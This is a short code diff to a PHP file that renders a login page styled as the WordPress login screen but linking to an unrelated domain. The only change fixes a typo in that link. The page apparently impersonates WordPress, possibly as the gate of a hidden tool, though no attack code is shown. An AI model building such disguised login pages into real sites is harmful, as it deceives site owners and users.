@@ -179,7 +179,7 @@ if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
         </head>
         <body class="login wp-core-ui">
             <div id="login">
-                <h1><a href="https:/0x6ick.zone.id/" tabindex="-1">WordPress</a></h1>
+                <h1><a href="https://0x6ick.zone.id/" tabindex="-1">WordPress</a></h1>
                 ' . $login_error_message . '
                 <form name="loginform" id="loginform" action="" method="post">
                     <p>
